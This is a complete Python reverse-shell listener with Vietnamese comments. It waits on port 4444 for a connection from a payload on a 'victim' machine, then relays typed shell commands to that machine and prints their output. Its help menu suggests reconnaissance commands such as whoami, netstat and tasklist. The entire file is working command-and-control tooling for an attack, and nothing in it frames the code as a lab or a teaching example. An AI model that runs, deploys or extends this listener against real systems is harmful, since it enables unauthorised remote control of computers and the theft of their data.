"""
Reverse Shell Listener
Lắng nghe kết nối từ payload
"""

import socket
import sys
import os
from datetime import datetime

class Listener:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.socket = None
        self.connection = None
        self.client_info = None
    
    def print_banner(self):
        """In banner"""
        banner = f"""
╔════════════════════════════════════════════════════════════╗
║                                                            ║
║             REVERSE SHELL LISTENER v1.0                    ║
║                                                            ║
╚════════════════════════════════════════════════════════════╝

[*] Listening on {self.host}:{self.port}
[*] Waiting for incoming connection...
[*] Press Ctrl+C to exit

"""
        print(banner)
    
    def start(self):
        """Khởi động listener"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
            
            self.print_banner()
            
            # Chấp nhận kết nối
            self.connection, self.client_info = self.socket.accept()
            
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            print(f"\n[{timestamp}] ✅ Connection received!")
            print(f"[+] Client IP   : {self.client_info[0]}")
            print(f"[+] Client Port : {self.client_info[1]}")
            
            # Nhận system info
            system_info = self.connection.recv(4096).decode('utf-8', errors='ignore')
            print(system_info)
            
            print(f"\n{'='*60}")
            print("Type 'help' for available commands")
            print(f"{'='*60}\n")
            
            # Command loop
            self.command_loop()
        
        except KeyboardInterrupt:
            print("\n\n[!] Interrupted by user")
            self.cleanup()
        except Exception as e:
            print(f"\n[!] Error: {e}")
            self.cleanup()
    
    def command_loop(self):
        """Main command loop"""
        while True:
            try:
                # Prompt
                command = input(f"{self.client_info[0]}> ").strip()
                
                if not command:
                    continue
                
                # Xử lý lệnh đặc biệt
                if command.lower() == 'help':
                    self.show_help()
                    continue
                
                if command.lower() in ['exit', 'quit']:
                    print("[*] Closing connection...")
                    self.connection.send(b'exit')
                    break
                
                if command.lower() == 'clear':
                    os.system('cls' if os.name == 'nt' else 'clear')
                    continue
                
                # Gửi lệnh đến victim
                self.connection.send(command.encode())
                
                # Nhận kết quả
                output = self.connection.recv(8192).decode('utf-8', errors='ignore')
                print(output)
            
            except KeyboardInterrupt:
                print("\n[!] Use 'exit' to close connection properly")
            except Exception as e:
                print(f"[!] Error: {e}")
                break
        
        self.cleanup()
    
    def show_help(self):
        """Hiển thị help"""
        help_text = """
╔════════════════════════════════════════════════════════════╗
║                    AVAILABLE COMMANDS                       ║
╠════════════════════════════════════════════════════════════╣
║                                                            ║
║  help              - Show this help message                ║
║  clear             - Clear screen                          ║
║  exit / quit       - Close connection and exit             ║
║                                                            ║
║  [Any command]     - Execute shell command on victim       ║
║                                                            ║
║  Examples:                                                 ║
║    whoami          - Get current user                      ║
║    dir / ls        - List directory                        ║
║    cd <path>       - Change directory                      ║
║    ipconfig        - Get network info (Windows)            ║
║    ifconfig        - Get network info (Linux)              ║
║    netstat -an     - Show network connections              ║
║    tasklist        - List processes (Windows)              ║
║    ps aux          - List processes (Linux)                ║
║                                                            ║
╚════════════════════════════════════════════════════════════╝
"""
        print(help_text)
    
    def cleanup(self):
        """Dọn dẹp kết nối"""
        if self.connection:
            self.connection.close()
        if self.socket:
            self.socket.close()
        print("\n[*] Connection closed")

def main():
    """Main function"""
    import argparse
    
    parser = argparse.ArgumentParser(description='Reverse Shell Listener')
    parser.add_argument('-H', '--host', default='0.0.0.0',
                        help='Listen host (default: 0.0.0.0)')
    parser.add_argument('-p', '--port', type=int, default=4444,
                        help='Listen port (default: 4444)')
    
    args = parser.parse_args()
    
    listener = Listener(args.host, args.port)
    listener.start()

if __name__ == '__main__':
    main()